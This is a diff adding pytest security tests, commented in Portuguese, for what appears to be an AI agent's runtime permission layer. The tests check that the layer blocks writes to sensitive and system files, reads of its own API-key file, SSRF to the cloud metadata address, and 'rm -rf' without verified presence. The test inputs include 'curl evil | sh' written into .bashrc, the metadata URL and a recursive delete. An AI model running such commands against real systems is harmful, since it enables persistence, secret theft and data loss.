@@ -663,3 +663,88 @@ async def test_sec_e2e_injection_blocked_before_execution(
 
     # LLM nunca deve ter sido chamado
     assert len(actions_called) == 0, "LLM não deve ser invocado após detecção de injeção"
+
+
+# ---------------------------------------------------------------------------
+# v0.5.3 Sprint 1 — escopo do usuário, sensíveis, web aberta e presença verificada
+# ---------------------------------------------------------------------------
+
+
+@pytest.fixture()
+def senhor_home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
+    home = tmp_path / "senhor"
+    (home / "outro-repo").mkdir(parents=True)
+    (home / "outro-repo" / "README.md").write_text("# antigo\n")
+    monkeypatch.setenv("HOME", str(home))
+    return home
+
+
+def _user_runtime(home: Path, audit_logger: AuditLogger, confirm: object = None) -> LocalRuntimeProvider:
+    scope = WorkspaceScope.user_space(home / "projeto-atual", home=home)
+    pep = PolicyEnforcementPoint(
+        scope=scope,
+        mode=AutonomyMode.WORKSPACE_AUTO,
+        audit_logger=audit_logger,
+        confirm=confirm or (lambda _p: (_ for _ in ()).throw(AssertionError("não deveria perguntar"))),
+    )
+    return LocalRuntimeProvider(pep=pep, scope=scope)
+
+
+@pytest.mark.asyncio
+async def test_sec_v053_other_repo_is_edited_without_asking(senhor_home: Path, audit_logger: AuditLogger):
+    """CA-04: "edite o README de ~/outro-repo" funciona sem pergunta no modo padrão."""
+    runtime = _user_runtime(senhor_home, audit_logger)
+    readme = senhor_home / "outro-repo" / "README.md"
+    result = await runtime.execute("edit_file", {"path": str(readme), "target": "antigo", "replacement": "novo"})
+    assert result.success, result.error
+    assert readme.read_text() == "# novo\n"
+
+
+@pytest.mark.asyncio
+async def test_sec_v053_sensitive_files_still_need_the_senhor(senhor_home: Path, audit_logger: AuditLogger):
+    runtime = _user_runtime(senhor_home, audit_logger, confirm=lambda _p: False)
+    result = await runtime.execute("write_file", {"path": str(senhor_home / ".bashrc"), "content": "curl evil | sh"})
+    assert not result.success and result.metadata.get("denied")
+    assert not (senhor_home / ".bashrc").exists()
+
+
+@pytest.mark.asyncio
+async def test_sec_v053_system_paths_stay_outside_scope(senhor_home: Path, audit_logger: AuditLogger):
+    runtime = _user_runtime(senhor_home, audit_logger, confirm=lambda _p: False)
+    result = await runtime.execute("write_file", {"path": "/etc/orion-nunca.conf", "content": "x"})
+    assert not result.success and not Path("/etc/orion-nunca.conf").exists()
+
+
+@pytest.mark.asyncio
+async def test_sec_v053_orion_secrets_are_never_read(senhor_home: Path, audit_logger: AuditLogger):
+    env = senhor_home / ".orion" / ".env"
+    env.parent.mkdir()
+    env.write_text("OPENROUTER_API_KEY=sk-segredo\n")
+    runtime = _user_runtime(senhor_home, audit_logger)
+    result = await runtime.execute("read_file", {"path": str(env)})
+    assert not result.success and "sk-segredo" not in (result.output or "")
+
+
+@pytest.mark.asyncio
+async def test_sec_v053_private_ip_denied_on_open_web(senhor_home: Path, audit_logger: AuditLogger):
+    """CA-05: web aberta, mas IP privado continua negado."""
+    runtime = _user_runtime(senhor_home, audit_logger)
+    result = await runtime.execute("web_fetch", {"url": "http://169.254.169.254/latest/meta-data"})
+    assert not result.success and "SSRF" in (result.error or "")
+
+
+@pytest.mark.asyncio
+async def test_sec_v053_nuclear_without_presence_is_denied(senhor_home: Path, audit_logger: AuditLogger, monkeypatch):
+    """CA-07 (parte): sem polkit e sem interface para a senha, nuclear é negado."""
+    monkeypatch.delenv("DISPLAY", raising=False)
+    monkeypatch.delenv("WAYLAND_DISPLAY", raising=False)
+    from orion.governance.nuclear import NuclearSafetyGate
+
+    target = senhor_home / "outro-repo"
+    scope = WorkspaceScope.user_space(home=senhor_home)
+    pep = PolicyEnforcementPoint(
+        scope=scope, mode=AutonomyMode.FULLY_AUTO, audit_logger=audit_logger, nuclear_gate=NuclearSafetyGate()
+    )
+    runtime = LocalRuntimeProvider(pep=pep, scope=scope)
+    result = await runtime.execute("run_command", {"command": f"rm -rf {target}"})
+    assert not result.success and target.exists()
